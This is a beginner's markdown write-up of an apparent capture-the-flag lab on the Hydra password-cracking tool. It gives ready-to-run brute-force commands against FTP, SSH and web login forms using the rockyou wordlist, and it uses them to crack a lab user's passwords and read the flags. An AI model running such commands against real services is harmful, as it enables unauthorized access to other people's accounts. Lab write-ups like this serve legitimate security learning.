@@ -1,0 +1,92 @@
+---
+title: "Hydra"
+author: "hacker_newb"
+date: "2023-08-01"
+categories: [hashes, password]
+image: Hydra.png
+---
+
+
+Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.
+
+
+## Hydra
+
+Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.
+
+
+- you can use a whole bunch of protocols (FTP,HTTP,IRC,SSH, POP3, etc) to brute force
+
+This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use `admin:password` as the default login credentials, which is obviously not strong enough.
+
+- hydra is installed in Kali
+- `sudo apt install hydra` 
+
+
+## Task 2
+
+Hydra commands `hydra -l <USERNAM> -P <PATH TO PASSWORDS> IP_address -t <NUM> <PROTOCOL>`.
+
+| option  |  description      |
+|---------|-------------------|
+| `-l`    | username login    |
+| `-P`    | list of passwords |
+| `-t`    | number of threads |
+
+
+- brute force FTP, username is 'user' and using a password list (passwordlist.txt) then syntax `hydra -l user -P passwordlist.txt ftp://IP_address`
+
+- brute force SSH, `hydra -l root -P passwords.txt IP_address -t 4 ssh`
+
+
+- brute force web forms, must know the type of request GET/POST, can see source code to see request types
+
+
+Web Form
+
+| option            | description                     |
+|-------------------|---------------------------------|
+| `-l`              | username for login              |
+| `-P`              | password list                   |
+| `http-post-form`  | POST form                       |
+| `<path>`          | login URL (login.php)           |
+| `<login_creds>`   | `username=^USER&password^PASS^` |
+| `<invalid_cred>`  | login fail response             |
+| `-v`              | verbose output for every attempt|
+
+
+- `sudo hydra USERNAME WORDLIST IP_address http-post-form "<PATH>:<login_creds>:<invalid_cred>"`
+- 
+
+
+Inside the AttackBox, go to IP_address and see a Username and Password login form.
+
+Question: _Use Hydra to bruteforce molly's web password. What is flag 1?_
+
+- `hydra -l molly -P /usr/share/wordlists/rockyou.txt IP_address http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect" -V`
+- hydra quickly finds the password and you can login and get the flag
+
+Question: _Use Hydra to bruteforce molly's SSH password. What is flag 2?_
+
+- `hydra -l molly -P /usr/share/wordlists/rockyou.txt IP_address ssh`
+- `ssh molly@IP_address` > `ls` > `cat flag2.txt` and get the flag
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
